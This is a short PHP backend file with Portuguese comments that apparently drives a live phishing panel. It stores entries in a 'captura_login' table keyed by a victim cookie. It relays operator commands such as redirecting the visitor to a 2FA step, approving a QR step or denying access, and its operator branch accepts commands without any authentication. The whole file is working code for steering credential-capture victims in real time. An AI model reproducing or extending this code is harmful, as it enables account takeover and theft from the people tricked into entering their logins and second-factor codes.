<?php
header('Content-Type: application/json');
require_once __DIR__ . '/db.php'; // Conexão com o banco

// 1. LÊ OS DADOS DA REQUISIÇÃO
$data = json_decode(file_get_contents('php://input'), true);
$status_from_request = $data['status'] ?? null;
$lead_id_from_admin = $data['id'] ?? null;

if (empty($status_from_request)) {
    echo json_encode(['success' => false, 'error' => 'Status não fornecido.']);
    exit;
}

// 2. LÓGICA DE DECISÃO CENTRAL
if ($lead_id_from_admin) {
    // --- CENÁRIO 1: O ADMIN ESTÁ ENVIANDO UM COMANDO ---
    // A requisição contém um 'id', então é um comando direto do painel.
    try {
        $sql = "UPDATE captura_login SET status = ? WHERE id = ?";
        $stmt = $pdo->prepare($sql);
        $stmt->execute([$status_from_request, $lead_id_from_admin]);
        echo json_encode(['success' => true, 'message' => 'Comando do admin executado.']);
    } catch (PDOException $e) {
        error_log('Erro ao executar comando do admin: ' . $e->getMessage());
        http_response_code(500);
        echo json_encode(['success' => false, 'error' => 'Erro interno ao executar comando.']);
    }

} else {
    // --- CENÁRIO 2: O CLIENTE ESTÁ ENVIANDO UM "PING" DE LOCALIZAÇÃO ---
    // A requisição não tem 'id', então usamos o cookie para identificar o cliente.
    $session_id_from_client = $_COOKIE['identificador_cliente'] ?? null;
    if (!$session_id_from_client) {
        echo json_encode(['command' => null, 'error' => 'Sessão do cliente não encontrada.']);
        exit;
    }

    try {
        // Primeiro, lemos o status atual no banco para este cliente.
        $stmt_check = $pdo->prepare("SELECT status FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1");
        $stmt_check->execute([$session_id_from_client]);
        $current_db_status = $stmt_check->fetchColumn();

        $admin_commands = ['redirecionar_para_2fa', 'aprovado_para_qr', 'negado'];

        // Se o status atual for um comando do admin, devolvemos esse comando para o cliente executar.
        if ($current_db_status && in_array($current_db_status, $admin_commands)) {
            echo json_encode(['command' => $current_db_status]);
            exit;
        }

        // Se não houver comando, atualizamos a localização do cliente com o status que ele enviou.
        $sql_update = "UPDATE captura_login SET status = ? WHERE id = (
                        SELECT id FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1
                       )";
        $stmt_update = $pdo->prepare($sql_update);
        $stmt_update->execute([$status_from_request, $session_id_from_client]);
        
        // E respondemos que não há nenhum comando pendente.
        echo json_encode(['command' => null]);

    } catch (PDOException $e) {
        error_log('Erro no ping do cliente: ' . $e->getMessage());
        http_response_code(500);
        echo json_encode(['command' => null, 'error' => 'Erro interno no ping.']);
    }
}
?>